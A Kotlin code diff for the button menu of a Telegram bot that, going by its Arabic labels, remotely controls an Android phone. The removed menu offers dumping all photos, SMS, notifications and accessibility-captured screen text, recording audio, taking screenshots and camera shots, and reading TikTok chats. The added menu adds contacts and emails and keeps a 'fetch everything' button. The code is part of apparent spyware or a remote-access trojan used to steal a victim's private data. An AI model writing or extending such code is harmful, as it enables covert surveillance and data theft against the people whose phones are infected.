@@ -5,62 +5,61 @@ import org.json.JSONObject
 
 object KeyboardBuilder {
 
-    fun mainMenu(): JSONObject {
-        val rows = JSONArray()
+    /**
+     * قائمة الأزرار الرئيسية (Reply Keyboard — أسفل الشاشة)
+     */
+    fun replyKeyboard(): JSONObject {
+        val keyboard = JSONArray()
 
-        rows.put(row(btn("🌐 فتح الموقع", "open_site")))
-        rows.put(row(btn("📊 معلومات الجهاز", "info")))
-        rows.put(row(btn("📍 الموقع الحالي", "location")))
-        rows.put(row(btn("📸 كل الصور", "photos_all")))
-        rows.put(row(
-            btn("📸 آخر 50", "photos_50"),
-            btn("📸 آخر 200", "photos_200")
-        ))
-        rows.put(row(btn("📩 كل الرسائل SMS", "sms_all")))
-        rows.put(row(btn("🔔 كل الإشعارات", "notifs_all")))
-        rows.put(row(btn("📝 نصوص الشاشة", "accessibility_log")))
-        rows.put(row(btn("🗑 حذف نصوص Accessibility", "accessibility_clear")))
-        rows.put(row(
-            btn("🎤 بدء التسجيل", "audio_start"),
-            btn("⏹ إيقاف التسجيل", "audio_stop")
-        ))
-        rows.put(row(btn("📷 لقطة شاشة الآن", "screen_once")))
-        rows.put(row(
-            btn("📷 لقطات كل 30s", "screen_loop_start"),
-            btn("🛑 إيقاف اللقطات", "screen_loop_stop")
-        ))
-        rows.put(row(btn("📹 فيديو 30s", "video_30")))
-        rows.put(row(
-            btn("🤳 كاميرا أمامية", "cam_front"),
-            btn("📸 كاميرا خلفية", "cam_back")
-        ))
-        rows.put(row(btn("🎵 تيك توك — فتح", "tiktok_open")))
-        rows.put(row(btn("🎵 تيك توك — المحادثات", "tiktok_messages")))
-        rows.put(row(btn("🎵 تيك توك — اقرأ الشاشة", "tiktok_read_screen")))
-        rows.put(row(btn("🚀 جلب كل شي مع بعض", "fetch_all")))
-        rows.put(row(btn("🔄 تحديث القائمة", "menu")))
+        // الصف 1: الصور
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "📸 كل الصور"))
+            put(JSONObject().put("text", "📸 آخر 50"))
+        })
 
-        return JSONObject().apply { put("inline_keyboard", rows) }
+        // الصف 2: الرسائل والإشعارات
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "📩 كل الرسائل"))
+            put(JSONObject().put("text", "🔔 الإشعارات"))
+        })
+
+        // الصف 3: جهات الاتصال والإيميلات
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "👥 جهات الاتصال"))
+            put(JSONObject().put("text", "📧 الإيميلات"))
+        })
+
+        // الصف 4: الجهاز والموقع
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "📊 معلومات الجهاز"))
+            put(JSONObject().put("text", "📍 الموقع"))
+        })
+
+        // الصف 5: تيك توك
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "🎵 تيك توك"))
+        })
+
+        // الصف 6: جلب شامل
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "🚀 جلب كل شي"))
+        })
+
+        return JSONObject().apply {
+            put("keyboard", keyboard)
+            put("resize_keyboard", true)
+            put("one_time_keyboard", false)
+            put("is_persistent", true)
+        }
     }
 
-    fun backToMenu(): JSONObject {
-        val rows = JSONArray()
-        rows.put(row(btn("🏠 القائمة الرئيسية", "menu")))
-        return JSONObject().apply { put("inline_keyboard", rows) }
-    }
+    fun backToMenu(): JSONObject = replyKeyboard()
 
     fun stopJob(jobId: String): JSONObject {
         val rows = JSONArray()
-        rows.put(row(btn("🛑 إيقاف العملية", "stop_$jobId")))
+        rows.put(JSONArray().apply {
+            put(JSONObject().put("text", "🛑 إيقاف العملية").put("callback_data", "stop_$jobId"))
+        })
         return JSONObject().apply { put("inline_keyboard", rows) }
     }
-
-    private fun btn(text: String, callback: String): JSONObject =
-        JSONObject().apply {
-            put("text", text)
-            put("callback_data", callback)
-        }
-
-    private fun row(vararg buttons: JSONObject): JSONArray =
-        JSONArray().apply { buttons.forEach { put(it) } }
 }
